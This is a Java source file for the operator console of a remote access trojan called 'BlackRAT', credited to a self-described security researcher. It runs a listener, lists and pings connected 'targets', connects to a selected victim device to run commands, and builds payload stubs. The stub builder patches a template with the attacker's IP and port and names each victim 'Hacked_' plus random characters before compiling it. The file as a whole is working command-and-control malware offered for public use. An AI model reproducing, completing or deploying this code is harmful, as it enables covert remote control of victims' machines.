package user_interface;
import java.io.*;
import java.util.Iterator;
import java.net.Socket;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Scanner;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ThreadLocalRandom;

import Application.RandomString;
import Application.Server;
import Application.Streams;
public class MainClass {
	
private static void connect(Server server) throws IOException {
	System.out.println("\n Select Target ID [0..n]: ");
	ping(server);
	int selected = Integer.parseInt(new BufferedReader(new InputStreamReader(System.in)).readLine());
	Iterator <Socket> iterator = server.getmap().keySet().iterator();
	Socket selectedSocket = iterator.next();
	for (int i=0 ; i !=selected ; i++) {
		if(iterator.hasNext()) 
			selectedSocket = iterator.next();
		else
		{
			System.err.println("Invalid Target ID");
			return;
		}
		Streams selectedstreams = server.getmap().get(selectedSocket);
		Connections connected = new Connections(selectedstreams);
	    System.out.println("Connected to target : " + selectedSocket.getRemoteSocketAddress());
		connected.execute();
	}
}
public static void main(String[] args) throws IOException {
	banner();
	BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
	String portStr = null;
	System.out.println("Enter your port : ");
	portStr = br.readLine();
	int port = Integer.parseInt(portStr);
	System.out.println("Connected Port : " + port);
	try {
	 Server server = new Server(port);
	 server.startserver();
	 BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
	 String sel = "";	
	 while (!sel.equals("e")) {
		 System.out.println("\nChoose an opreation to execute : \n"
		 		+ " (1)- Stop the server"
		 		+ " \n (2)- Ping Client"
		 		+ " \n (3)- Connect to Device"
		 		+ " \n (4)- Compile Stub"
		 		+ " \n (5)- Exit");
		 sel = reader.readLine();
		 switch (sel) {
		case "1": if (!server.isRunning()) {
			System.err.println("Server already idle");
			System.err.flush();
			break;
		} else {
			
			server.stopserver();
			break;
		}

		case "2":
			if (!server.isRunning()) {
				System.err.println("Server already idle");
				System.err.flush();
				break;
			}
			
			ping(server);
			break;
		case "3" :if (!server.isRunning()) {
			System.err.println("Server already idle");
			System.err.flush();
			break;
		}
		
		connect(server);
		break;
			
		case "4": 
        BufferedReader brr = new BufferedReader(new InputStreamReader(System.in));
        String IPAdd = null;
        System.out.println("Enter your IP Address or DNS Host : ");
        IPAdd = brr.readLine();

        BufferedReader brrr = new BufferedReader(new InputStreamReader(System.in));
        String Port = null;
        System.out.println("Enter Connected Port : ");
        Port = brr.readLine();
        CreateServer(IPAdd,Port);
		break;
			
		case "5": 
			server.isRunning(); 
		   	server.stopserver();
		    reader.close();		
		 
		default: break;
		}
	 } 
	} catch (Exception e) {System.err.println("\nServer exception!\n"); e.printStackTrace();}	
}

private static void ping(Server server) {
ConcurrentHashMap <Socket,Streams> map = server.getmap();
int i = 0;
for (Socket s : map.keySet()) {
	if(!map.get(s).sendMsG("PING") || map.get(s).ReadMsg() == null) {
		System.err.println("Client not responding : " + s.getRemoteSocketAddress());
	    System.err.flush();
	    map.remove(s);
	} 
	else 
		System.out.println(i + ") " + s.getRemoteSocketAddress());
	    i++;
	}
}
private static void banner() {
	System.out.println("  ____  _            _    _____         _______ \n" + 
			" |  _ \\| |          | |  |  __ \\     /\\|__   __|\n" + 
			" | |_) | | __ _  ___| | _| |__) |   /  \\  | |   \n" + 
			" |  _ <| |/ _` |/ __| |/ /  _  /   / /\\ \\ | |   \n" + 
			" | |_) | | (_| | (__|   <| | \\ \\  / ____ \\| |   \n" + 
			" |____/|_|\\__,_|\\___|_|\\_\\_|  \\_\\/_/    \\_\\_|   \n" + 
			"                                                \n" + 
			"                                                ");
	System.out.println("[-----------------------------------------------------]");
	System.out.println("[ Version     : 2.0 - Public Edition                  ]");
	System.out.println("[ Coded by    : Awais khan Security Researcher     ]");
	System.out.println("[ Copyright   : Cyberatic Security - 2018          ]");
	System.out.println("[-----------------------------------------------------]\n");

}

public static void CreateServer(String IPAdress,String port) throws IOException, InterruptedException{
	Path path = Paths.get("server.java");
    Path toPath = Paths.get("output.java");
    Charset charset  = Charset.forName("UTF-8");
    BufferedWriter writer = Files.newBufferedWriter(toPath, charset);
    Scanner scanner = new Scanner(path,charset.name());
	String readline;
    while(scanner.hasNextLine()) {
    	readline = scanner.nextLine();
    	readline = readline.replace("package Application;", "");
    	readline = readline.replace("DummyStub", "output");
    	readline = readline.replace("IPAddress", IPAdress);
    	readline = readline.replace("PORTNumber", port);
    	readline = readline.replace("VicTimName","Hacked_" + RandomString.Generate(8));
    	writer.write(readline);
    	writer.newLine();
    }
    scanner.close();
    writer.close();

	Runtime r = Runtime.getRuntime();
	Process p = r.exec("javac output.java");
	p.waitFor();
	BufferedReader b = new BufferedReader(new InputStreamReader(p.getInputStream()));
	String line = "";
	System.out.println("Stub has been compiled");
	b.close();	
}
}
